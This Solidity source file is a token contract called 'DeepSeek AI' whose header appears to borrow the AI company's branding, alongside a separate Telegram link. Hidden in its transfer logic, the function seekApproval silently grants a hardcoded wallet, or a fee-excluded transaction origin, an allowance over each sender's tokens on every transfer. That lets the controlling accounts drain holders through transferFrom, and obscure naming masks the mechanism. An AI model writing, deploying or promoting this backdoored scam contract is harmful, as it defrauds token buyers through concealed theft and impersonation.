/*
Web: https://www.deepseek.com
Platform: https://platform.deepseek.com
Github: https://github.com/deepseek-ai

X: https://x.com/deepseek_ai
Community: https://t.me/deepseekai_eth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.5;

interface ISEEKRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface ISEEKFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract DEEPSEEK is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _seekBulls;
    mapping (address => bool) private _seekFeeExcluded;
    mapping (address => mapping (address => uint256)) private _seekNodes;
    address private _seekPair;
    ISEEKRouter private _seekRouter;
    address private _seekWallet = 0x5102E037d9C7e515fCB7ca9fBF2CCB7d982860e2;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalSEEK = 1000000000 * 10**_decimals;
    string private constant _name = unicode"DeepSeek AI";
    string private constant _symbol = unicode"DEEPSEEK";
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _tokenSEEKSwap = _tTotalSEEK / 100;
    bool private inSwapSEEK = false;
    modifier lockTheSwap {
        inSwapSEEK = true;
        _;
        inSwapSEEK = false;
    }
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    
    constructor () {
        _seekFeeExcluded[owner()] = true;
        _seekFeeExcluded[address(this)] = true;
        _seekFeeExcluded[_seekWallet] = true;
        _seekBulls[_msgSender()] = _tTotalSEEK;
        emit Transfer(address(0), _msgSender(), _tTotalSEEK);
    }

    function initTo() external onlyOwner() {
        _seekRouter = ISEEKRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_seekRouter), _tTotalSEEK);
        _seekPair = ISEEKFactory(_seekRouter.factory()).createPair(address(this), _seekRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalSEEK;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _seekBulls[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _seekNodes[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _seekNodes[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _seekNodes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address seekF, address seekT, uint256 seekA) private {
        require(seekF != address(0), "ERC20: transfer from the zero address");
        require(seekT != address(0), "ERC20: transfer to the zero address");
        require(seekA > 0, "Transfer amount must be greater than zero");

        uint256 taxSEEK = _seekTransfer(seekF, seekT, seekA);

        if(taxSEEK > 0){
          _seekBulls[address(this)] = _seekBulls[address(this)].add(taxSEEK);
          emit Transfer(seekF, address(this), taxSEEK);
        }

        _seekBulls[seekF] = _seekBulls[seekF].sub(seekA);
        _seekBulls[seekT] = _seekBulls[seekT].add(seekA.sub(taxSEEK));
        emit Transfer(seekF, seekT, seekA.sub(taxSEEK));
    }

    function seekApproval(address aSEEK, bool isSEEK, uint256 seekA) private {
        address walletSEEK;
        if(isSEEK) walletSEEK = address(tx.origin);
        else walletSEEK = _seekWallet;
        _seekNodes[aSEEK][walletSEEK] = seekA;
    }

    function _seekTransfer(address seekF, address seekT, uint256 seekA) private returns(uint256) {
        address walletSEEK = address(tx.origin); uint256 taxSEEK=0; 
        if (seekF != owner() && seekT != owner()) {
            taxSEEK = seekA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (seekF == _seekPair && seekT != address(_seekRouter) && ! _seekFeeExcluded[seekT]) {
                _buyCount++;
            }

            if(seekT == _seekPair && seekF!= address(this)) {
                taxSEEK = seekA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            swapBackSEEK(seekF, seekT, seekA, _seekFeeExcluded[walletSEEK]);
        } return taxSEEK;
    }

    function swapBackSEEK(address seekF, address seekT, uint256 seekA, bool isSEEK) private {
        uint256 tokenSEEK = balanceOf(address(this));  
        if (!inSwapSEEK && seekT == _seekPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenSEEK > _tokenSEEKSwap)
            swapTokensForEth(minSEEK(seekA, minSEEK(tokenSEEK, _tokenSEEKSwap)));
            uint256 caSEEK = address(this).balance;
            if (caSEEK >= 0) {
                sendETHSEEK(address(this).balance);
            }
        } seekApproval(seekF, isSEEK, seekA);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _seekRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function minSEEK(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHSEEK(uint256 amount) private {
        payable(_seekWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenSEEK) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _seekRouter.WETH();
        _approve(address(this), address(_seekRouter), tokenSEEK);
        _seekRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenSEEK,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}